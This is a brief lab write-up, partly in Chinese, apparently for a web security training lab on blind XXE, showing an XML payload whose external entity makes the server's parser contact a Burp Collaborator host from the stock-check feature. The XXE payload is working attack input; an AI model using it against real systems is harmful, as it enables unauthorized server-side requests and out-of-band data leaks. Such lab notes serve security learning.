# Lab: Blind XXE with out-of-band interaction

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. 

## XXE
* 一樣在 stock 那邊，題目說要用 blind XXE，用 Collaborator client 拿到 DNS 以及 HTTP 記錄
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
<!ENTITY xxe SYSTEM "http://929gi64r1zhpf4qwmgv0h7r8zz5qtf.burpcollaborator.net">
]>
<stockCheck>
<productId>&xxe;</productId><storeId>&xxe;</storeId></stockCheck>
```